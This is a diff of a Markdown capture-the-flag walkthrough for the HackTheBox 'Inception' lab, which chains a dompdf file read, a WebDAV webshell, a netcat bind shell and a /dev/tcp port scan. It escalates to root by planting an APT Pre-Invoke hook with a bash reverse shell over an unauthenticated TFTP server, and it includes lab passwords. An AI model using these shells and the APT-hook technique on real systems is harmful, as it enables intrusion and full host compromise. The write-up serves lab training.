@@ -1,10 +1,14 @@
 # HTB: Inception Walkthrough
 
-![Image](Inception.png)
+    ![Image](Inception.png)
 
-### Overview
+<p align="center">
+<img src="Inception.png" alt="drawing" width="1000"/>
+</p>
 
-lalalallalalalla
+## Overview
+
+[link](http://127.0.0.1)
 
 ## Initial Scan
 
@@ -149,7 +153,7 @@ Looking back at our notes we search a little deeping in regards to dompdf. Seacr
 
 ![image](searchsploit.png)
 
-## Exploitation Arbitrary File Read
+## Exploitation: Arbitrary File Read
 
 ### POC 
 
@@ -169,7 +173,7 @@ We decode the string with the following base64 command and confirm the reading o
 
 ![image](passwd-output.png)
 
-## Searching for information on the target
+## Enumeration Of The Target
 
 There was a lot of searching to be done on this box, but when we start checking web server configuration files, we come across an interseting find. 
 
@@ -238,7 +242,11 @@ curl -u webdav_tester:babygurl69 'http://10.129.1.104/webdav_test_inception/shel
 
 ![image](confirm-execution.png)
 
-## Automate our Remote Code Execution Exploit With Python
+## Target Enumeration
+
+After a lot of trying, we are unable to get a reverse shell back to our Kali machine. We are unable to get any kind of connection backk to kali.
+
+## Automate our Remote Code Execution With Python
 
 The following python script runs commands on the target with the curl command used preveously. It uses hURL to url encode the commands. The while loops gives us a feeling of a shell and lets us send commands a little faster.
 
@@ -265,11 +273,11 @@ while True:
 
 ## Shell As www-data
 
-With our python script we can search the file system. We can also run linpea.sh from it if we wanted. 
+With our python script we can search a lot of files. We can also run linpea.sh from it, to speed up the process. 
 
-### Uploading NetCat to the target and getting a shell
+### Uploading NC to the target ANd Getting A reverse Shell
 
-Using the webdave exploit we can upload the nc binary from Kali. First we copy the nc binary to our current directory.
+Using the webdave exploit we can upload the nc version on Kali. First we copy the nc binary to our current directory.
 
 ```
 cp /usr/bin/nc .
@@ -278,21 +286,23 @@ cp /usr/bin/nc .
 Then we can upload the file to the /webdav_test_inception/ directory on the target machine, using the curl command.
 
 ```
-curl -T 'ncat' --basic --user 'webdav_tester:babygurl69' 'http://10.129.1.104/webdav_test_inception/'
+curl -T 'nc' --basic --user 'webdav_tester:babygurl69' 'http://10.129.1.104/webdav_test_inception/ncat'
 ```
 
 Confirm the nc file with out python script.
 
 ![image](ncat-upload.png)
 
-First we chmod the permissions on the ncat binary. After a little testing, we setup a listener on the target system, on port 1234. With our python script, we run the following command on the target.
+First we chmod the permissions on the ncat binary. After a little testing, we setup a listener on port 1234. With our python script, we run the following command on the target.
 
 ```
 chmod 777 ncat
 ./ncat -nvlp 1234 -e /bin/bash
 ```
 
-From our Kali machine, we use proxychains and connect to the listener on port 1234. We know we can connect to open ports though proxychains as we proved earlier when accessing port 22.
+![image](ncat-listener-www-data.png)
+
+From our Kali machine, we use proxychains and connect to the listener on port 1234.
 
 ```
 proxychains nc -nv 127.0.0.1 1234
@@ -312,3 +322,220 @@ export SHELL=/bin/bash; export TERM=screen; stty rows 23 columns 139; reset
 ```
 
 ![image](upgrade-shell.png)
+
+## Shell As User cobb
+
+### Enumeration
+
+While looking inside interesting directories we find the wordpress_4.8.3 directory, located at /var/www/html/wordpress_4.8.3/. A password search inside /var/www/html/ uncovers database credentials.
+
+```
+grep --color=auto -rnw '/var/www/html/' -ie "DB_PASSWORD" --color=always 2> /dev/null
+```
+
+![image](wp-password.png)
+
+The content of /var/www/html/wordpress_4.8.3/wp-config.php reveal MySQL credentials of:
+
+```
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+```
+
+A quick search with netstat shows no MySQL on local host, but there are two connections from 192.168.0.10 that stand out. We will add that IP to our notes.
+
+![image](netstat-mysql.png)
+
+### Password reuse
+
+With no MySQL to connect to we will use the password found in wp-config.php and try to su to user root or cobb. We login as user cobb with the following command.
+
+```su - cobb
+Password: VwPddNh7xMZyDQoByQL4
+```
+
+Checking the what groups the user is part of, we see that cobb is part of the sudo group.
+
+```
+id
+```
+![image](cobb-id.png)
+
+### User flag
+
+We can access the user flag in /hom/cobb.
+
+```
+cat /home/cobb/user.txt 
+4*****************************c
+```
+
+## Shell As root
+
+User cobb is part of the sudo group so all we need to do is su as root. We cat the root flag but ther is a message and no hash.
+
+```
+sudo su -
+[sudo] password for cobb: VwPddNh7xMZyDQoByQL4
+```
+
+![image](root-container.png)
+
+## Container Enumeration
+
+Looking at some network command outputs, we see that we are connected to a container. ip a shows that we have a docker interface. The output shows that we are on the 192.168.0.0/24 subnet.
+
+```
+root@Inception:~# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 00:16:3e:28:53:63 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 192.168.0.10/24 brd 192.168.0.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe28:5363/64 scope link 
+       valid_lft forever preferred_lft forever
+root@Inception:~# 
+```
+
+Looking into this a little further, we check the network configuration information. The output from cat /etc/network/interfaces suggests the host is located at 192.168.0.1, as this is the gateway address.
+
+### Port scanning the host
+
+We can scan the ports of the target at 192.168.0.1 a lot of different ways. 
+
+```bash
+#!/bin/bash
+# Scans stuff.
+
+	  # 21 25 80
+for port in {1..65535};do
+        timeout .1 bash -c "echo >/dev/tcp/192.168.0.1/$port" 2> /dev/null &&
+                echo "port $port is open"
+        done
+echo "Done"
+```
+
+The port scan uncovers three open ports. TCP port 21, 22 and 53 are open.
+
+![image](192-port-scan.png)
+
+### FTP 
+
+Accessing the ftp server on 192.168.0.1, we are in the / directory of the target. We cann acces a lot of files and directories here. 
+
+Download /etc with wget
+
+```
+wget -r ftp://anonymous:@192.168.0.1/etc/\*
+```
+
+### Crontab 
+
+Looking at what jobs are running on the target at 192.168.0.1 we find two commands running as root.
+
+```
+root@Inception:/tmp/hacker/192.168.0.1/etc# cat crontab
+
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
+30 23	* * *	root	apt upgrade -y 2>&1 >/dev/null
+```
+
+APT update is running every 5 minutes. I take a look on gtfobins for information on the command. A section on Gtfobins mentions command execution pre update command execution.
+
+![image](gtfobins.png)
+
+Searching a little more into this I search google for 'apt run pre commands'. I come across a post on stackexchange https://unix.stackexchange.com/questions/204414/how-to-run-a-command-before-download-with-apt-get . The post mentions the pre-invoke command being executed from the /apt.conf.d/ directory. 
+
+```
+$ sudo cat /etc/apt/apt.conf.d/05new-hook
+APT::Update::Pre-Invoke {"your-command-here"};
+```
+
+![image](stack.png)
+
+Searching for information on the /apt.conf.d/ directory, I find information in the [apt.conf.d man pages](https://manpages.ubuntu.com/manpages/trusty/man5/apt.conf.5.html#:~:text=%2Fetc%2Fapt%2Fapt.,to%20provide%20a%20uniform%20environment.).
+
+If we place a file in the /etc/apt/apt.conf.d/ directory, we can execute Pre/Post commands as apt update is run. Looking at the /etc/apt/apt.conf.d/ directory, we see we have no write privileges.
+
+## TFTP
+
+Continuing the search of the /etc directory on FTP, we find the default configuration file for a tftp sever. 
+
+```
+cat /192.168.0.1/etcdefault/tftpd-hpa
+```
+
+![image](tftp-config.png)
+
+The server is running as root as root and is hsoting the / filesystem. Tftp does not have any security or authentication, so let's try and write to the target at 192.168.0.1. We will try and write to /home and confirm the files excistenc by connecting to ftp.
+
+Create a file named test.txt, then connect to the target via tftp. Write the file to /home/, exit tftp and loging to ftp and confirm that test.txt was written to /home/
+
+![image](tftp-confirm.png)
+
+
+## Privilege Escalation On COntainer Host
+
+We have write access to the / file system via the tftp misconfiguration, we also know that apt update is running as a cron job every 5 minutes. 
+
+With the information about 'APT::Update::Pre-Invoke' and our write access, we can create a file inside /etc/apt/apt.conf.d/. The contents of the file will execute our chosen command prior to apt update being executed.
+
+### Putting it all together
+
+We will create a file named 'exploit' and enter the following configuration into it. 
+
+```
+vim exploit
+```
+
+The configuration will execute a bash reverse shell to the container on port 1234. We use this port as we know it will be accessable.
+
+```
+APT::Update::Pre-Invoke {"/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.10/1234 0>&1'"}
+```
+
+We then connect via tftp and upload our explit configuration file to the apt.conf.d directory.
+
+```
+tftp 192.168.0.1
+tftp> put exploit /etc/apt/apt.conf.d/exploit
+Sent 92 bytes in 0.0 seconds
+tftp> q
+```
+
+Once the file is uploaded, we use netcat to listen on port 1234. We get the connection as root on the container host at 192.168.0.1
+
+![image](root-host.png)
+
+---
+
+---
